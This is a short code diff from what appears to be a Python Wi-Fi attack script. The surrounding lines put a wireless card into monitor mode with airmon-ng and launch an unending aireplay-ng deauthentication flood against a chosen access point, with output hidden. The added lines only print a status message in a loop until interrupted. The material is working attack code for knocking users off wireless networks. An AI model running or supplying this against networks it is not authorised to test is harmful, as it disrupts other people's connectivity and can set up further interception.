@@ -106,3 +106,9 @@ hackchannel = acitve_wireless_networks[int(choice)].strip()
 
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
+
+try:
+    while True:
+        print("Deauthenticating clients, press ctrl-c to stop")
+except KeyboardInterrupt:
+    print("Stop monitoring mode")
